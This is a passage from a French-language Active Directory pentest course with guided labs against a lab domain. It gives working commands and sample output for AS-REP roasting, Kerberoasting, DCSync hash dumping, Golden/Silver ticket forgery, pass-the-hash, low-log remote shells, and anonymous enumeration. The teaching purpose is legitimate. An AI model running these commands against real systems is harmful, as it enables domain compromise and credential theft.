L'AS-REP Roasting cible les utilisateurs pour lesquels la pré-authentification Kerberos est désactivée (UAC flag `DONT_REQUIRE_PREAUTH`). On peut demander un AS-REP sans connaître le mot de passe.

```bash
# ─── Demande de TGT pour les utilisateurs sans pré-authentification ───────────
# GetNPUsers.py cible les comptes avec DONT_REQUIRE_PREAUTH activé
# Demande un TGT sans connaître le mot de passe (AS-REP Roasting, T1558.004)
GetNPUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10

# Sortie type (si un compte est vulnérable) :
# $krb5asrep$23$jsmith@SDV-M2.LAB:... (hash à craquer)

# ─── Avec utilisation d'un fichier d'utilisateurs (sans auth) ─────────────────
# Peut fonctionner sans authentification si le fichier utilisateurs est fourni
# Teste chaque utilisateur du fichier pour détecter ceux sans pré-auth
GetNPUsers.py sdv-m2.lab/ -usersfile exports/users.txt -dc-ip 192.168.1.10

# ─── Export vers fichier ──────────────────────────────────────────────────────
GetNPUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 \
  -outputfile exports/hashes/asrep-hashes.txt

# ─── Mode hashcat pour AS-REP = 18200 ─────────────────────────────────────────
# -m 18200 : mode hashcat pour les hashs AS-REP (format $krb5asrep$)
hashcat -m 18200 exports/hashes/asrep-hashes.txt /usr/share/wordlists/rockyou.txt
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `GetNPUsers.py` | Outil Impacket pour AS-REP Roasting (T1558.004) |
| `-dc-ip <IP>` | Adresse IP du contrôleur de domaine |
| `-usersfile <fichier>` | Fichier contenant les noms d'utilisateurs à tester (peut fonctionner sans auth) |
| `-outputfile <fichier>` | Sauvegarde les hashs dans un fichier pour craquage |
| Format `$krb5asrep$23$*...` | Hash AS-REP (mode hashcat 18200) |
| `-m 18200` | Mode hashcat pour les hashs AS-REP Kerberos |

### 6.7 Autres outils impacket utiles

#### GetADUsers.py

```bash
# ─── Énumération des utilisateurs AD (tous les attributs) ─────────────────────
# -all : liste tous les utilisateurs avec leurs attributs (mail, téléphone, département, etc.)
GetADUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -all

# ─── Avec filtre sur un utilisateur spécifique ────────────────────────────────
# -user jdoe : limite la recherche à un utilisateur spécifique
GetADUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -user jdoe
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-all` | Énumère tous les utilisateurs avec tous leurs attributs AD |
| `-user <nom>` | Filtre la recherche sur un utilisateur spécifique |

#### lookupsid.py

```bash
# ─── Bruteforce SID via RPC (sans authentification possible) ─────────────────
# lookupsid.py énumère les SID (Security Identifiers) via RPC
# anonymous@ : tente une connexion anonyme (NULL session) - peut échouer sur des DC récents
lookupsid.py anonymous@192.168.1.10

# ─── Avec authentification ────────────────────────────────────────────────────
# Avec des identifiants valides, enumeration SID complète
lookupsid.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `lookupsid.py anonymous@IP` | Tentative d'énumération SID anonyme (NULL session, souvent bloquée sur les DC récents) |
| `lookupsid.py user:pass@IP` | Énumération SID avec authentification (plus fiable) |
| SID | Security Identifier : identifiant unique de chaque objet dans AD (user, groupe, etc.) |

#### rpcdump.py

```bash
# ─── Énumération des endpoints RPC ────────────────────────────────────────────
# rpcdump.py liste les endpoints RPC (Remote Procedure Call) disponibles sur la cible
rpcdump.py 192.168.1.10

# Cherche les interfaces RPC vulnérables :
# - 12345678-1234-ABCD-EF00-0123456789AB (lsarpc : interface LSA)
# - 12345778-1234-ABCD-EF00-0123456789AC (samr : interface SAM)
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `rpcdump.py <IP>` | Liste tous les endpoints RPC exposés sur la cible (port 135) |
| `lsarpc` | Interface LSA (Local Security Authority) - peut exposer des secrets |
| `samr` | Interface SAM (Security Account Manager) - permet l'énumération d'utilisateurs |

#### ticketer.py

```bash
# ─── Forge d'un Golden Ticket ─────────────────────────────────────────────────
# Golden Ticket : TGT forgé avec le hash KRBTGT (valable 10 ans)
# -nthash : hash NT du compte krbtgt (extrait via DCSync)
# -domain-sid : SID du domaine (nécessaire pour la construction du ticket)
# -user-id 500 : RID de l'Administrateur (500 = compte admin intégré)
impacket-ticketer -nthash 'KRBTGT_NTHASH' \
  -domain-sid 'S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX' \
  -domain sdv-m2.lab \
  -user-id 500 \
  Administrator

# ─── Forge d'un Silver Ticket (pour un service) ───────────────────────────────
# Silver Ticket : TGS forgé pour un service spécifique (CIFS pour accès fichiers)
# -spn : Service Principal Name du service cible (ex: CIFS, HTTP, MSSQLSvc)
# Valide uniquement pour le service spécifié, mais ne nécessite que le hash du service
impacket-ticketer -nthash 'SERVICE_NTHASH' \
  -domain-sid 'S-1-5-21-...' \
  -domain sdv-m2.lab \
  -spn 'CIFS/dc01.sdv-m2.lab' \
  Administrator
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-nthash <hash>` | Hash NT du compte KRBTGT (Golden) ou du compte de service (Silver) |
| `-domain-sid <SID>` | SID du domaine (récupérable via lookupsid.py ou BloodHound) |
| `-user-id 500` | RID = 500 (compte Administrateur intégré) |
| `-spn <SPN>` | Service Principal Name pour le Silver Ticket (ex: CIFS, HTTP, MSSQLSvc) |
| Golden Ticket | Accès à **tous** les services de tout le domaine (via TGT KRBTGT) |
| Silver Ticket | Accès à **un seul** service (via TGS du compte de service) |

#### goldenPac.py

```bash
# ─── Golden Ticket + PSExec en une commande ──────────────────────────────────
# goldenPac.py combine la forgery de ticket et l'exécution distante
# -dc-ip : IP du DC pour la résolution Kerberos
# -target-ip : IP de la machine cible (peut être différente du DC)
goldenPac.py sdv-m2.lab/Administrator@dc01.sdv-m2.lab \
  -dc-ip 192.168.1.10 -target-ip 192.168.1.10
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `goldenPac.py` | Combine la forgery de Golden Ticket avec PSExec pour un accès complet |
| `-dc-ip <IP>` | Adresse IP du contrôleur de domaine |
| `-target-ip <IP>` | Adresse IP de la machine cible de l'exécution |

### 6.8 TP Guidé — Extraction de hashs via Impacket

#### Contexte

Vous avez les droits administrateur sur le DC du domaine `sdv-m2.lab` avec les identifiants `jdoe:P@ssw0rd`.

#### Étape 1 : DCSync — Extraction de tous les hashs du domaine

```bash
# ─── Extraction des hashs du domaine (méthode DRSUAPI) ────────────────────────
# DCSync complet : extrait tous les hashs du domaine via le protocole DRSUAPI
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -just-dc \
  -outputfile exports/dcsync-full

# ─── Vérification des résultats ───────────────────────────────────────────────
# Affiche le fichier contenant tous les hashs extraits
cat exports/dcsync-full.ntds
# Format : username:RID:LM_HASH:NT_HASH:::

# ─── Extraire uniquement les hashs NT ─────────────────────────────────────────
# grep -v '^\$' : exclut les lignes commençant par $ (en-têtes/metadata)
# cut -d: -f1,4 : garde les champs 1 (username) et 4 (NT hash) séparés par ":"
grep -v '^\$' exports/dcsync-full.ntds | cut -d: -f1,4 > exports/hashes/nt-hashes-only.txt

# ─── Identifier le hash KRBTGT (critique pour Golden Ticket) ──────────────────
# Le hash du compte krbtgt est la clé pour forger des Golden Tickets
grep 'krbtgt' exports/dcsync-full.ntds
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `secretsdump.py ... -just-dc -outputfile ...` | DCSync : extraction complète des hashs du domaine via DRSUAPI |
| `cat exports/dcsync-full.ntds` | Affiche le fichier brut des hashs (format username:RID:LM:NT:::) |
| `grep -v '^\$' ... \| cut -d: -f1,4` | Nettoie la sortie : garde uniquement username:NT_HASH |
| `grep 'krbtgt' ...` | Extrait la ligne du compte krbtgt (critique pour Golden Ticket) |

#### Étape 2 : Kerberoasting

```bash
# ─── Identification des comptes SPN ──────────────────────────────────────────
# Liste les comptes avec SPN (Service Principal Name) : cibles Kerberoasting
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10

# ─── Demande des TGS ─────────────────────────────────────────────────────────
# -request : demande les TGS et exporte les hashs Kerberos
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request \
  -outputfile exports/hashes/kerb-hashes.txt

# ─── Craquage ─────────────────────────────────────────────────────────────────
# -m 13100 : mode hashcat pour les TGS Kerberos (format $krb5tgs$)
hashcat -m 13100 exports/hashes/kerb-hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `GetUserSPNs.py ...` | Énumère les comptes avec SPN (Kerberoastables) |
| `GetUserSPNs.py ... -request -outputfile ...` | Demande les TGS pour ces comptes et exporte les hashs |
| `hashcat -m 13100 ...` | Craquage des hashs TGS avec la wordlist rockyou |

#### Étape 3 : AS-REP Roasting

```bash
# ─── Identification des comptes sans pré-authentification ────────────────────
# GetNPUsers.py : AS-REP Roasting, demande un TGT sans pré-authentification
GetNPUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 \
  -outputfile exports/hashes/asrep-hashes.txt

# ─── Craquage ─────────────────────────────────────────────────────────────────
# -m 18200 : mode hashcat pour les hashs AS-REP (format $krb5asrep$)
hashcat -m 18200 exports/hashes/asrep-hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `GetNPUsers.py ... -dc-ip ... -outputfile ...` | AS-REP Roasting : extrait les hashs des comptes sans pré-authentification |
| `hashcat -m 18200 ...` | Craquage des hashs AS-REP avec rockyou |

#### Étape 4 : Exécution de commandes distantes

```bash
# ─── Shell via wmiexec (discret) ──────────────────────────────────────────────
# WMI : pas de fichier sur le disque, pas de service créé (logs limités)
wmiexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Shell via psexec (moins discret) ─────────────────────────────────────────
# PSExec : copie un binaire via ADMIN$, crée un service (logs Event ID 7045)
psexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Shell via dcomexec (très discret) ────────────────────────────────────────
# DCOM : utilise des objets COM légitimes, très peu de traces
dcomexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -object MMC20
```

**Explication des commandes :**
| Méthode | Discrétion | Détection | Logs |
|---------|-----------|-----------|------|
| `wmiexec.py` | Moyenne | Modérée | WMI-Activity 5857, 5858 |
| `psexec.py` | Faible | Haute | 7045 (service), 4688 (process) |
| `dcomexec.py -object MMC20` | Haute | Faible | Très peu d'événements |

#### Étape 5 : Pass-the-Hash avec les hashs obtenus

```bash
# ─── Utilisation du hash Administrateur pour un accès complet ─────────────────
# Pass-the-Hash : utilise le hash NT de l'Administrateur (extrait via DCSync)
# -hashes ':ADMIN_NTHASH' : hash NT uniquement (LM vide)
psexec.py sdv-m2.lab/Administrator@192.168.1.10 -hashes ':ADMIN_NTHASH'

# ─── Vérifier que vous êtes SYSTEM ───────────────────────────────────────────
# Une fois le shell ouvert, whoami confirme le niveau de privilège
# C:\Windows\system32> whoami
# nt authority\system
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `psexec.py ... -hashes ':ADMIN_NTHASH'` | Pass-the-Hash avec le hash Administrateur pour exécution de commandes |
| `whoami` | Commande Windows qui affiche le nom de l'utilisateur/du contexte courant |
| `nt authority\system` | Plus haut niveau de privilège sur Windows |

---

## 7. Énumération sans authentification

### 7.1 Introduction

Même sans disposer d'identifiants valides, il est possible d'obtenir des informations sur un environnement Active Directory via des protocoles legacy ou mal configurés.

**Technique MITRE ATT&CK : T1087 — Account Discovery / T1078 — Valid Accounts (Guest)**

Ces techniques sont particulièrement utiles en phase de reconnaissance initiale, avant d'avoir compromis un compte.

### 7.2 NULL Session

Les **NULL sessions** sont une vulnérabilité historique de Windows (pré-Windows 2000) qui permet de se connecter à un partage IPC$ sans authentification. Bien que Microsoft ait restreint ce comportement dans les versions récentes, des configurations legacy peuvent encore l'autoriser.

```bash
# ─── Test de NULL session avec net use (Windows) ──────────────────────────────
# net use : commande Windows pour se connecter à un partage réseau
# IPC$ : partage administratif inter-processus (souvent accessible)
# "" /u:"" : utilisateur et mot de passe vides (NULL session)
net use \\192.168.1.10\IPC$ "" /u:""
# Si la connexion réussit, les partages sont accessibles sans authentification

# ─── Test de NULL session avec smbclient ──────────────────────────────────────
# smbclient : client SMB Linux (fourni par Samba)
# -L : liste les partages disponibles
# -N : no password (tente une connexon sans authentification)
smbclient -L //192.168.1.10 -N
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `net use \\IP\IPC$ "" /u:""` | NULL session Windows : tente une connexion sans identifiants au partage IPC$ |
| `smbclient -L //IP -N` | NULL session Linux : liste les partages SMB sans authentification |
| `-N` | Pas de mot de passe (No password) - tente une connexion anonyme |

#### enum4linux

`enum4linux` est un outil Perl qui automatise l'énumération via NULL sessions et RPC.

```bash
# ─── Installation ─────────────────────────────────────────────────────────────
# Installe enum4linux (outil Perl automatisant l'énumération via NULL sessions/RPC)
sudo apt update && sudo apt install -y enum4linux

# ─── Énumération complète via NULL session ────────────────────────────────────
# -a : mode tout-énumérer (users, shares, groups, password policy, OS, etc.)
enum4linux -a 192.168.1.10

# Sortie type (extrait) :
# ============================
#    Target Information
# ============================
# Target ........... 192.168.1.10
# RID Cycling ...... ENABLED
#
# ============================================
#    Users on 192.168.1.10
# ============================================
# Index: 0x1 RID: 0x1f4  acb: 0x00000210 Account: Administrator
# Index: 0x2 RID: 0x1f5  acb: 0x00000215 Account: Guest
# Index: 0x3 RID: 0x1f7  acb: 0x00000211 Account: DefaultAccount
# Index: 0x4 RID: 0x1f8  acb: 0x00000211 Account: krbtgt
# Index: 0x5 RID: 0x3e8  acb: 0x00000210 Account: jdoe
# Index: 0x6 RID: 0x3e9  acb: 0x00000210 Account: asmith
# ...

# Options enum4linux :
#   -a         : tout énumérer (équivaut à -U -S -G -P -r -o -L -i)
#   -U         : lister les utilisateurs
#   -S         : lister les partages
#   -G         : lister les groupes
#   -P         : lister les politiques de mot de passe
#   -r         : RID cycling (bruteforce des RID)
#   -o         : informations sur le OS
#   -L         : LSA policy
#   -i         : paramètres de la NP (named pipe)
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `sudo apt install -y enum4linux` | Installe l'outil d'énumération enum4linux (dépendances Perl) |
| `enum4linux -a 192.168.1.10` | Lance une énumération complète (-a = all) via NULL session/RPC |
| `-U` | Enumère les utilisateurs (via SAMR) |
| `-S` | Enumère les partages SMB |
| `-G` | Enumère les groupes |
| `-P` | Récupère la politique de mot de passe |
| `-r` | RID cycling : brute-force les RID pour découvrir des utilisateurs |
| `RID` | Relative ID : suffixe du SID qui identifie un compte (500 = Admin, 501 = Guest, etc.) |
| `acb: 0x00000210` | Attributs du compte (account control bits) |

```bash
# ─── Énumération utilisateurs uniquement ──────────────────────────────────────
enum4linux -U 192.168.1.10

# ─── Énumération des partages uniquement ──────────────────────────────────────
enum4linux -S 192.168.1.10

# ─── RID Cycling (bruteforce des identifiants RID) ────────────────────────────
# Brute-force les RID pour découvrir les noms d'utilisateurs et groupes
enum4linux -r 192.168.1.10

# ─── Politique de mot de passe ────────────────────────────────────────────────
# Récupère la politique de sécurité du domaine (utile pour planifier du password spraying)
enum4linux -P 192.168.1.10

# Sortie :
# ============================================
#    Password Policy on 192.168.1.10
# ============================================
# Password Info for Domain: SDV-M2
#     Password History Length: 24
#     Maximum Password Age: 42 jours
#     Minimum Password Age: 1 jour
#     Minimum Password Length: 8
#     Password Properties: DOMAIN_PASSWORD_COMPLEX
#     Account Lockout Threshold: 5 tentatives
#     Lockout Duration: 30 minutes
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-U` | Énumération des utilisateurs via SAMR (sans authentification) |
| `-S` | Liste des partages SMB disponibles |
| `-r` | RID Cycling : brute-force séquentiel des RID pour découvrir tous les comptes |
| `-P` | Politique de mot de passe : longueur min, verrouillage, complexité, historique |
| `lockoutThreshold: 5` | 5 tentatives invalides avant verrouillage du compte |
| `minPwdLength: 8` | Longueur minimale du mot de passe |
| `DOMAIN_PASSWORD_COMPLEX` | Complexité requise (majuscule, minuscule, chiffre, spécial) |

#### rpcclient

`rpcclient` est un outil plus fin qui permet d'interagir directement avec les services RPC.

```bash
# ─── Connexion avec NULL session ──────────────────────────────────────────────
# rpcclient : client RPC pour interagir directement avec les services Windows
# -U "" : utilisateur vide (anonyme)  |  -N : no password (NULL session)
rpcclient -U "" -N 192.168.1.10

# Une fois connecté (invite rpcclient $>) :

# ─── Lister les utilisateurs ─────────────────────────────────────────────────
# enumdomusers : liste tous les utilisateurs du domaine avec leur RID
rpcclient $> enumdomusers
# Sortie :
# user:[Administrator] rid:[0x1f4]
# user:[Guest] rid:[0x1f5]
# user:[krbtgt] rid:[0x1f6]
# user:[jdoe] rid:[0x3e8]
# user:[asmith] rid:[0x3e9]

# ─── Informations sur un utilisateur spécifique ──────────────────────────────
# queryuser <RID> : affiche les attributs détaillés d'un utilisateur
rpcclient $> queryuser 0x3e8
# Sortie :
#       User Name   : jdoe
#       Full Name   : John Doe
#       Home Drive  :
#       Dir Drive   :
#       Profile Path:
#       Logon Script:
#       Description :
#       Workstations:
#       Comment     :
#       Remote Dial :
#       Logon Time               : Thu, 01 Jan 2025 00:00:00 UTC
#       Logoff Time              : Thu, 01 Jan 1970 00:00:00 UTC
#       Kickoff Time             : Thu, 01 Jan 1970 00:00:00 UTC
#       Password last set Time   : Mon, 01 Jan 2025 08:30:00 UTC
#       Password can change Time : Mon, 01 Jan 2025 08:30:00 UTC
#       Password must change Time: Thu, 01 Jan 1970 00:00:00 UTC

# ─── Lister les groupes ──────────────────────────────────────────────────────
# enumdomgroups : liste tous les groupes du domaine avec leur RID
rpcclient $> enumdomgroups

# ─── Membres d'un groupe ─────────────────────────────────────────────────────
# querygroupmem <RID_du_groupe> : liste les membres d'un groupe
# 0x200 = RID du groupe Domain Admins
rpcclient $> querygroupmem 0x200  # Domain Admins

# ─── Informations sur un groupe ──────────────────────────────────────────────
# querygroup <RID> : affiche les attributs d'un groupe
rpcclient $> querygroup 0x200

# ─── Énumération des SID ─────────────────────────────────────────────────────
# lookupsids <SID> : résout un SID en nom de compte (inverse de lookupnames)
rpcclient $> lookupsids S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500
# Résout un SID en nom d'utilisateur

# ─── Politique de mot de passe ────────────────────────────────────────────────
# getdompwinfo : affiche la politique de mot de passe du domaine
rpcclient $> getdompwinfo

# ─── Quitter ─────────────────────────────────────────────────────────────────
rpcclient $> exit
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `rpcclient -U "" -N <IP>` | Ouvre une connexion RPC NULL session (sans authentification) |
| `enumdomusers` | Énumère tous les utilisateurs du domaine avec leur RID hexadécimal |
| `queryuser <RID>` | Affiche les attributs détaillés d'un utilisateur (dates, scripts, etc.) |
| `enumdomgroups` | Énumère tous les groupes du domaine |
| `querygroupmem <RID>` | Liste les membres d'un groupe (ex: 0x200 = Domain Admins) |
| `querygroup <RID>` | Affiche les informations d'un groupe |
| `lookupsids <SID>` | Résout un SID en nom d'utilisateur ou de groupe |
| `getdompwinfo` | Récupère la politique de mot de passe du domaine |
| RID 0x200 | RID du groupe Domain Admins (500 = Administrator, 501 = Guest, 502 = krbtgt) |

**Commandes rpcclient utiles :**

| Commande | Description |
|----------|-------------|
| `enumdomusers` | Lister tous les utilisateurs |
| `enumdomgroups` | Lister tous les groupes |
| `queryuser <rid>` | Détails d'un utilisateur |
| `querygroup <rid>` | Détails d'un groupe |
| `querygroupmem <rid>` | Membres d'un groupe |
| `enumalsgroups <builtin|domain>` | Groupes locaux |
| `getdompwinfo` | Politique de mot de passe |
| `lookupnames <name>` | Résoudre un nom en SID |
| `lookupsids <sid>` | Résoudre un SID en nom |
| `enumpriv <user>` | Privilèges d'un utilisateur |
| `srvinfo` | Informations sur le serveur |
| `netshareenum` | Lister les partages |
| `netsharegetinfo <share>` | Infos sur un partage |

### 7.3 Guest Account

Le compte **Guest** est un compte local présent sur toutes les installations Windows. Bien que désactivé par défaut dans les versions récentes, il arrive qu'il soit activé dans certaines configurations.

```bash
# ─── Vérifier si le compte Guest est actif ────────────────────────────────────
# Via enum4linux : cherche la mention "guest" dans la sortie enum4linux
enum4linux -a 192.168.1.10 | grep -i guest

# Via rpcclient : examine les attributs du compte Guest (RID 0x1f5 = 501)
rpcclient -U "" -N 192.168.1.10
rpcclient $> queryuser 0x1f5
# Voir le champ "acb_flags" : 0x0215 = compte activé, 0x0211 = désactivé

# ─── Tester un accès avec le compte Guest ─────────────────────────────────────
# Mot de passe souvent vide (par défaut)
crackmapexec smb 192.168.1.10 -u Guest -p ''
crackmapexec smb 192.168.1.10 -u Guest -p 'Guest'

# ─── Avec smbclient ───────────────────────────────────────────────────────────
# -U Guest : tente une connexion avec le nom d'utilisateur Guest
smbclient -L //192.168.1.10 -U Guest
# Mot de passe : (laisser vide)
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `enum4linux -a ... \| grep -i guest` | Vérifie la présence et l'état du compte Guest dans les résultats enum4linux |
| `queryuser 0x1f5` | Interroge le compte Guest (RID 501 = 0x1f5) pour voir ses attributs |
| `acb_flags: 0x0215` | 0x0215 = compte activé (le bit 0x0004 = ACB_DISABLED n'est pas positionné) |
| `crackmapexec ... -u Guest -p ''` | Teste la connexion SMB avec le compte Guest et mot de passe vide |
| `smbclient -L //... -U Guest` | Teste la connexion SMB via smbclient avec l'utilisateur Guest |

### 7.4 SMB Null Session sur anciennes versions

Sur les systèmes anciens (Windows 2000, XP, Server 2003) ou mal configurés, la NULL session est encore possible :

```bash
# ─── Test avec net view (ancienne commande Windows) ───────────────────────────
# net view : commande Windows historique pour lister les ressources partagées
net view \\192.168.1.10

# ─── Utilisation de nmap scripts pour l'énumération ───────────────────────────
# Chaque script NSE (Nmap Scripting Engine) cible un aspect spécifique de SMB
nmap --script smb-enum-shares -p 445 192.168.1.10  # Liste les partages SMB
nmap --script smb-enum-users -p 445 192.168.1.10    # Énumère les utilisateurs
nmap --script smb-enum-groups -p 445 192.168.1.10   # Énumère les groupes
nmap --script smb-os-discovery -p 445 192.168.1.10  # Détection OS distant
nmap --script smb-protocols -p 445 192.168.1.10     # Négociation protocole SMB
nmap --script smb-security-mode -p 445 192.168.1.10 # Signature SMB activée ?
nmap --script smb-server-stats -p 445 192.168.1.10  # Statistiques serveur
nmap --script smb-system-info -p 445 192.168.1.10   # Infos système Windows

# ─── Smbclient avec NULL session pour lister les partages ─────────────────────
# -L : liste les partages  |  -N : no password (NULL session)
smbclient -L //192.168.1.10 -N
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `net view \\IP` | Commande Windows pour lister les ressources partagées sur une machine |
| `nmap --script smb-* -p 445` | Scripts NSE SMB pour énumérer partages, utilisateurs, groupes, OS |
| `smbclient -L //IP -N` | Client SMB Linux listant les partages sans authentification |

### 7.5 Autres techniques d'énumération sans auth

#### DNS Enumeration

```bash
# ─── Interrogation DNS des enregistrements AD ─────────────────────────────────
# Les enregistrements SRV d'AD sont publics si le DNS est accessible
# Ils révèlent l'emplacement des services AD (LDAP, Kerberos, GC)

# Résolution des DCs via SRV :
# -type=srv : interroge les enregistrements SRV (service locator)
nslookup -type=srv _ldap._tcp.sdv-m2.lab     # Localise les serveurs LDAP
nslookup -type=srv _kerberos._tcp.sdv-m2.lab # Localise les serveurs Kerberos
nslookup -type=srv _gc._tcp.sdv-m2.lab       # Localise le Global Catalog

# Avec dig :
# dig + type SRV : même requête mais format plus lisible
dig _ldap._tcp.sdv-m2.lab SRV
dig _kerberos._tcp.sdv-m2.lab SRV

# ─── Zone transfer (si mal configuré) ─────────────────────────────────────────
# axfr : transfert de zone DNS (révèle TOUS les enregistrements DNS)
# Généralement désactivé, mais parfois mal configuré sur les anciens DC
dig axfr @192.168.1.10 sdv-m2.lab
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `nslookup -type=srv _ldap._tcp.<domain>` | Résout les enregistrements SRV LDAP (découverte des DC) |
| `nslookup -type=srv _kerberos._tcp.<domain>` | Résout les serveurs Kerberos (authentication) |
| `nslookup -type=srv _gc._tcp.<domain>` | Résout le Global Catalog (port 3268) |
| `dig <service> SRV` | Alternative dig pour interroger les SRV records |
| `dig axfr @<IP> <domain>` | Transfert de zone DNS : tente de révéler tous les enregistrements DNS |
| `axfr` | Authoritative Transfer : copie complète de la zone DNS (T1590.002) |

#### SMB OS Fingerprinting (sans auth)

```bash
# ─── Avec nmap ────────────────────────────────────────────────────────────────
# smb-os-discovery : script NSE qui détecte l'OS Windows via le handshake SMB
nmap -p 445 --script smb-os-discovery 192.168.1.10

# Avec smbclient :
# -L : liste les partages  |  -N : no password (NULL session)
smbclient -L //192.168.1.10 -N

# Avec CME (sans authentification) :
# crackmapexec sans identifiants : détecte l'OS et le message de session refusée
crackmapexec smb 192.168.1.10
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `nmap -p 445 --script smb-os-discovery` | Détection du système d'exploitation via le protocole SMB |
| `smbclient -L //IP -N` | Liste les partages SMB (sans auth) et révèle les infos OS |
| `crackmapexec smb <IP>` | Fingerprinting SMB + OS + message d'erreur (donne le hostname même sans auth) |

### 7.6 TP Guidé — Énumération sans authentification

#### Contexte

Vous êtes en phase de reconnaissance initiale. Vous n'avez pas encore d'identifiants valides. Le domaine cible est `sdv-m2.lab`.

#### Étape 1 : Découverte des services

```bash
# ─── Scan initial du DC ───────────────────────────────────────────────────────
# Scan de ports typiquement ouverts sur un contrôleur de domaine AD
nmap -p 135,139,445,389,636,88,464,3268,3269 192.168.1.10

# Ports à rechercher :
# 135 → RPC (WMI)
# 139 → NetBIOS
# 445 → SMB
# 389 → LDAP
# 636 → LDAPS
# 88  → Kerberos
# 464 → Kerberos kpasswd
# 3268 → Global Catalog
```

**Explication des commandes :**
| Port | Service | Rôle |
|------|---------|------|
| 135 | RPC (MS-RPC) | Endpoint mapper pour WMI et DCOM |
| 139 | NetBIOS | Session service (legacy, souvent filtré) |
| 445 | SMB | Partage de fichiers, exécution, IPC |
| 389 | LDAP | Interrogation de l'annuaire AD |
| 636 | LDAPS | LDAP chiffré (SSL/TLS) |
| 88 | Kerberos | Authentification Kerberos (TCP/UDP) |
| 464 | Kerberos kpasswd | Changement de mot de passe Kerberos |
| 3268 | Global Catalog | Catalogue global AD (port LDAP GC) |
| 3269 | Global Catalog SSL | GC chiffré |

#### Étape 2 : Test de NULL session

```bash
# ─── Test avec rpcclient ──────────────────────────────────────────────────────
# Connexion NULL session au DC (tentative anonyme)
rpcclient -U "" -N 192.168.1.10
# Si connexion réussie, taper ces commandes dans l'invite rpcclient $> :
enumdomusers     # Liste tous les utilisateurs du domaine
enumdomgroups    # Liste tous les groupes du domaine
getdompwinfo     # Affiche la politique de mot de passe
exit             # Quitte rpcclient
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `rpcclient -U "" -N <IP>` | Connexion NULL session au service RPC du DC (sans login/pwd) |
| `enumdomusers` | Énumération de tous les utilisateurs du domaine via SAMR |
| `enumdomgroups` | Énumération de tous les groupes du domaine via SAMR |
| `getdompwinfo` | Récupération de la politique de mot de passe (verrouillage, complexité) |

#### Étape 3 : Énumération via enum4linux

```bash
# ─── Énumération complète ─────────────────────────────────────────────────────
# -a : tout énumérer (users, groups, shares, RID cycling, OS, policies...)
# 2>&1 : redirige stderr vers stdout (capture aussi les erreurs)
# tee : affiche et sauvegarde simultanément dans le fichier
enum4linux -a 192.168.1.10 2>&1 | tee exports/enum4linux-output.txt

# Analyse des résultats :
# grep avec expression étendue pour extraire les lignes clés
grep -E "User:|Group:|Password Info|Share" exports/enum4linux-output.txt
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `enum4linux -a <IP>` | Énumération SMB/RPC complète (tout type d'information) |
| `2>&1` | Redirige les erreurs (stderr) vers la sortie standard (stdout) |
| `tee <fichier>` | Duplique la sortie : à l'écran et dans le fichier |
| `grep -E "User:\|Group:\|Password Info\|Share"` | Filtre les résultats pour ne garder que les lignes pertinentes |

#### Étape 4 : DNS Enumeration

```bash
# ─── Découverte des DCs ───────────────────────────────────────────────────────
# dig + SRV + +short : requête DNS de type SRV, format concis
dig _ldap._tcp.sdv-m2.lab SRV +short    # Trouve les serveurs LDAP (DC)
dig _kerberos._tcp.sdv-m2.lab SRV +short # Trouve les serveurs Kerberos (DC)
dig _gc._tcp.sdv-m2.lab SRV +short       # Trouve le Global Catalog (port 3268)

# ─── Tentative de zone transfer ───────────────────────────────────────────────
# axfr : tente un transfert de zone complet (souvent bloqué)
dig axfr @192.168.1.10 sdv-m2.lab
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `dig <service> SRV +short` | Interrogation des enregistrements SRV (format court) |
| `dig axfr @<IP> <domaine>` | Transfert de zone DNS (révèle l'intégralité des enregistrements) |
| `SRV` | Service Record : enregistrement DNS pointant vers un service AD |
| `+short` | Option dig : affiche uniquement la réponse (format concis) |

#### Étape 5 : Test Guest Account

```bash
# ─── Tester le compte Guest ──────────────────────────────────────────────────
# Teste le compte Guest avec mot de passe vide puis "Guest" (valeurs par défaut)
